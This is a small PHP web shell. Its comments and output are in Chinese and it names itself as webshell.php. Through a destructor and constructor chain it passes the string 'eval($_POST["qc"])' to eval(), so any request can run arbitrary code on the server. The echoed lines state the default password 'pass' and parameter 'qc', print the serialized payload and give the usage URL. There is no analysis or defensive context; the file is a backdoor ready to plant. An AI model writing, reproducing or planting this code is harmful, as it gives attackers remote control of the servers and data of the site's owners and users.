<?php

class abc {
    public $aaa = 'def';
    public $bbb = 'eval($_POST["qc"]);';
    function __destruct(){
        new $this->aaa($this->bbb);
    }
}
class def {
    function __construct($haha){
        if (md5($_GET['pass'] === '1a1dc91c907325c69271ddf0c944bc72')){
            eval($haha);
        }
    }
}
$qc = new abc();
echo 'pass默认为：pass <br />';
echo '一句话密码默认为：qc <br />';
echo 'payload为：',serialize($qc),'<br />';
echo '利用方式：http://url/webshell.php?pass=pass';

?>